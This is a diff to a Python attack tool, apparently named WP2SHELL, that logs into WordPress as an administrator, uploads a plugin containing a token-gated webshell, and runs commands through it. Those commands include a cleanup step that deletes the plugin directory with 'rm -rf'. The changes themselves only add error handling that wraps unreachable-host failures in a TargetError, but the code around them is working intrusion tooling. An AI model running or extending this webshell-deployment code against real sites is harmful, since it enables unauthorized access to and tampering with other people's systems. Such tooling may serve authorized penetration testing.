@@ -17,6 +17,8 @@ import uuid
 import zipfile
 from typing import Dict, Optional, Tuple
 
+from .client import TargetError
+
 _MARKER = "WP2SHELL"
 
 
@@ -92,7 +94,7 @@ class AdminSession:
                 shell_path,
                 'd=$(pwd); case "$d" in */wp-content/plugins/*) cd / && rm -rf "$d";; esac',
             )
-        except OSError:
+        except (OSError, TargetError):
             return False
         if out is None:
             return False
@@ -100,7 +102,7 @@ class AdminSession:
             self._get(shell_path)
         except urllib.error.HTTPError as exc:
             return exc.code == 404
-        except OSError:
+        except (OSError, TargetError):
             return False
         return False
 
@@ -119,15 +121,24 @@ class AdminSession:
     # -- helpers ------------------------------------------------------------
 
     def _get(self, path: str) -> str:
-        return self._opener.open(self.base_url + path, timeout=self.timeout).read().decode(
-            "utf-8", "replace"
-        )
+        return self._open(self.base_url + path)
 
     def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
         if isinstance(data, dict):
             data = urllib.parse.urlencode(data).encode()
         request = urllib.request.Request(self.base_url + path, data=data, headers=headers or {})
-        return self._opener.open(request, timeout=self.timeout).read().decode("utf-8", "replace")
+        return self._open(request)
+
+    def _open(self, target) -> str:
+        # Wrap connection failures in TargetError so an unreachable host reads like check/read; leave
+        # HTTPError alone -- a 4xx/5xx is an auth/permission signal, not a liveness one.
+        try:
+            return self._opener.open(target, timeout=self.timeout).read().decode("utf-8", "replace")
+        except urllib.error.HTTPError:
+            raise
+        except OSError as exc:
+            reason = getattr(exc, "reason", exc)
+            raise TargetError(f"cannot reach {self.base_url}: {reason}") from None
 
     def _plugin_zip(self) -> bytes:
         # The webshell only runs when the request carries the per-session token.
